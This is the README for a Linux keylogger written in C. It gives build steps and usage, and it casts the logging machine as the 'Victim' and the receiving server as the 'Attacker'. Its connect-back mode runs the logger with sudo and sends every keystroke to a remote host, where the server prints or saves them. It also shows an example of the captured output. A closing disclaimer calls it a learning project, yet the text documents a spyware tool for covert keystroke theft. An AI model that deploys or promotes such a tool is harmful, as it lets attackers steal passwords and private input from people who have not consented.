This project is inspired by https://github.com/SCOTPAUL/keylog  

# keylog

A simple keylogger for Linux written in C. The current version will attempt to detect your keyboard event file automatically. 

## Usage

### Client (Victim)

#### File

```bash
cd keylogger_connectback/
sudo ./keylog -f file-to-write-to.txt
```

This will log all keystrokes to the specified file while the program is running.

#### Network

```bash
cd keylogger_connectback/
sudo ./keylog -n hostname
```

This will send all keystrokes to the server running on `hostname`.

### Server (Attacker)
You can disconnect the keylogger from the server side using Ctrl-C and terminate the server using Ctrl-*, where * is any character besides 'C'.

#### stdout

```bash
cd keylogger_connectback/
./server
```

This will write all keystrokes received from the client to stdout.

#### File

```bash
cd keylogger_connectback/
./server -f file-to-write-to.txt
```

This will write all keystrokes received from the client to the specified file.

## Output Format

Each key press will cause a string representing that key to be written to the
chosen location, followed by a newline. When the program quits, an extra newline will be added.

#### Example

Typing `hello world` and then quitting the program with `Ctrl-C' will cause the chosen location to contain the following.

```
H
E
L
L
O
SPACE
W
O
R
L
D
LEFTCTRL
C
```

## Building

```bash
cd keylogger_connectback/
make
```

# Disclaimer

This code was created entirely out of an interest in learning about linux keyboard events. It should never be used on any machine where you are not authorised to log keystrokes.

